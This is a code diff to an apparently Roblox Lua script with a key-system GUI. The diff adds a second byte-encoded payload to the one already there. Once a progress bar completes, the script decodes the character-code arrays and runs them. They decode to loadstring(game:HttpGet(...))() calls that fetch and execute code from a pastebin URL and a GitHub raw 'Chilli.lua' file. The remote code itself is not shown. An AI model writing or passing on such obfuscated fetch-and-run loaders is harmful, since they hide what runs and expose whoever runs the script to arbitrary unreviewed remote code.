@@ -121,10 +121,17 @@ end
 pulseButton(button)
 pulseButton(getKeyButton)
 
-local scriptBytes = {
+local scriptBytes1 = {
     108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,
     104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,
     103,98,50,100,54,103,65,53,34,41,41,40,41
+}
+
+local scriptBytes2 = {
+    108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,
+    104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,
+    110,116,101,110,116,46,99,111,109,47,116,105,101,110,107,104,97,110,104,49,47,115,112,105,
+    99,121,47,109,97,105,110,47,67,104,105,108,108,105,46,108,117,97,34,41,41,40,41
 }
 
 button.MouseButton1Click:Connect(function()
@@ -146,11 +153,11 @@ button.MouseButton1Click:Connect(function()
             if pct >= 1 then
                 conn:Disconnect()
                 gui:Destroy()
-                local scriptStr = ""
-                for _, v in ipairs(scriptBytes) do
-                    scriptStr = scriptStr .. string.char(v)
-                end
-                loadstring(scriptStr)()
+                local str1, str2 = "", ""
+                for _, v in ipairs(scriptBytes1) do str1 = str1 .. string.char(v) end
+                for _, v in ipairs(scriptBytes2) do str2 = str2 .. string.char(v) end
+                loadstring(str1)()
+                loadstring(str2)()
             end
         end)
     else
